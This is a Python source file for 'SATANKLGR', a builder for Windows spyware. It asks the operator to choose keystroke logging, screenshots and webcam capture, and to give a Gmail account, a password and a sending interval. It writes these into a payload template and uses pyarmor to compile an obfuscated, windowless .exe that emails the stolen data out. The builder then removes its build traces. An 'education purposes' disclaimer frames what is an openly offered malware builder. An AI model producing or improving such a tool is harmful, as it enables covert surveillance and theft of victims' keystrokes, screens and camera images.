from colorama import Fore
import os
import shutil

os.system("color")

def options():
    global send_screens, send_webcam, send_keystrokes, persistence, agreement, email1, password, interval
    send_screens = input(Fore.YELLOW+"Send screenshots [y/n]: "+Fore.WHITE).lower()
    send_webcam = input(Fore.YELLOW+"Send webcam [y/n]: "+Fore.WHITE).lower()
    send_keystrokes = input(Fore.YELLOW+"Send keystrokes [y/n]: "+Fore.WHITE).lower()
    email1 = input(Fore.YELLOW+"Enter your gmail"+Fore.LIGHTCYAN_EX+" (Do not use your basic gmail, only dedicated): "+Fore.WHITE)
    password  = input(Fore.YELLOW+"Enter your password for email: "+Fore.WHITE)
    interval = int(input(Fore.YELLOW+"Enter the interval of sending logs(in seconds): "+Fore.WHITE))

def agree():
    print(Fore.GREEN+"--------------------------------------------------------------")
    global agreement
    print(Fore.GREEN+"Email: ", Fore.WHITE+email1)
    print(Fore.GREEN+"Password: ", Fore.WHITE+password)
    print(Fore.GREEN+"Interval: ", Fore.WHITE+str(interval))
    print(Fore.GREEN+"Keystrokes: ", Fore.WHITE+send_keystrokes)
    print(Fore.GREEN+"Screenshots: ", Fore.WHITE+send_screens)
    print(Fore.GREEN+"Webcam: ", Fore.WHITE+send_webcam)
    print(Fore.GREEN+"--------------------------------------------------------------")
    agreement = input(Fore.YELLOW+"The information above is correct? [y/n]: ").lower()

def pyw_exe():
    try:
        print(Fore.YELLOW+"[*] Creating and writing to .py file...")
        print(Fore.GREEN+"[*] Done √")
        try:
            print(Fore.YELLOW+"[*] Compiling obfuscated .exe file...")
            print(Fore.RESET+"")
            os.system('pyarmor pack --clean -e "--onefile --windowed --icon=NONE" SATANKLGR.py')
            print(Fore.GREEN+"[*] The file SATANKLGR.exe is successfully compiled and saved in dist folder √")
            try:
                print(Fore.YELLOW+"[*] Removing needless foulders...")
                os.remove("SATANKLGR.py")
                shutil.rmtree("build")
                os.remove("SATANKLGR-patched.spec")
                os.remove("SATANKLGR.spec")
                print(Fore.GREEN+"[*] Foulders are successfully removed √...")
            except:
                print(Fore.RED+"[*] Impossible to remove foulders")
        except:
            print(Fore.RED+"[*] Impossible to compile and obfuscate .py file")
    except:
        print(Fore.RED+"[*] Impossible to compile .py file")

def exception():
    print()
    print(Fore.RED+"[*] Impossible to create and write to .py file")

def heading():
    print(Fore.RED + f'''

    ░██████╗░█████╗░████████╗░█████╗░███╗░░██╗██╗░░██╗██╗░░░░░░██████╗░██████╗░ ''',Fore.WHITE + "   [*] "+Fore.YELLOW+f"Written by FZGbzuw412",Fore.RED+f'''
    ██╔════╝██╔══██╗╚══██╔══╝██╔══██╗████╗░██║██║░██╔╝██║░░░░░██╔════╝░██╔══██╗
    ╚█████╗░███████║░░░██║░░░███████║██╔██╗██║█████═╝░██║░░░░░██║░░██╗░██████╔╝''',Fore.WHITE + "    [*] "+Fore.YELLOW+f"Only Satana can help you...", Fore.RED+f'''
    ░╚═══██╗██╔══██║░░░██║░░░██╔══██║██║╚████║██╔═██╗░██║░░░░░██║░░╚██╗██╔══██╗
    ██████╔╝██║░░██║░░░██║░░░██║░░██║██║░╚███║██║░╚██╗███████╗╚██████╔╝██║░░██║''', Fore.WHITE + "    [*] "+Fore.YELLOW+f"https://github.com/FZGbzuw412", Fore.RED+f'''

    ''',Fore.YELLOW + f'>> Do not forget to allow sending logs to your email >> https://www.google.com/settings/security/lesssecureapps')

heading()
print()

print(Fore.GREEN + f'''THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT 
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER FZGbzuw412 ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE 
CAUSED BY THIS PROGRAM.''')
print()

def precaution():
    global response
    response = input(Fore.LIGHTWHITE_EX + f"""BEFORE USING SATANKLGR YOU MUST AGREE WITH POLICY
WRITE IN CAPITAL LETTERS 'I AGREE WITH RULES' (IF YOU WANT TO LEAVE THIS PAGE PRINT 'BYE'): """)
precaution()

while response !='I AGREE WITH RULES' and response !='BYE':
    print(Fore.RED + "INCORRECT WRITING. TRY AGAIN")
    precaution()

if response == 'I AGREE WITH RULES':
    print("----------------------------------")
    print("You agree with policy")
    print("----------------------------------")
    print(Fore.RESET + "Choose the options you want SATANKLGR to do\n")
    options()
    agree()
    while agreement == 'n':
        print("----------------------------------")
        options()
        agree()
    else:
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        if send_keystrokes == 'n' and send_webcam == 'y' and send_screens == 'y':
            try:
                with open("Scripts\\webcam+screenshots.txt") as f:
                    data = f.read()
                    f.close
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
    '''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'n' and send_screens == 'n':
            print()
            try:
                with open("Scripts\\keystrokes.txt") as f:
                    data = f.read()
                    f.close
                with open ('SATANKLGR.py', 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
    '''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'y' and send_screens == 'n':
            print()
            try:
                with open("Scripts\\keystrokes+webcam.txt") as f:
                    data = f.read()
                    f.close
                with open ('SATANKLGR.py', 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'y' and send_screens == 'y':
            try:
                with open("Scripts\\all.txt") as f:
                    data = f.read()
                    f.close
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'n' and send_webcam == 'n' and send_screens == 'y':
            try:
                with open("Scripts\\screenshots.txt") as f:
                    data = f.read()
                    f.close
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'y' and send_webcam == 'n' and send_screens == 'y':
            try:
                with open("Scripts\\keystrokes.txt") as f:
                    data = f.read()
                    f.close
                with open ("SATANKLGR.py", 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
    '''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        elif send_keystrokes == 'n' and send_webcam == 'y' and send_screens == 'n':
            try:
                with open("Scripts\\webcam.txt") as f:
                    data = f.read()
                    f.close
                with open("SATANKLGR.py", 'w') as f:
                    f.write(f'''
Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

{data}
'''), f.close()
            except:
                exception()
            pyw_exe()
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        else:
            print("The compiling of exe file is impossible")
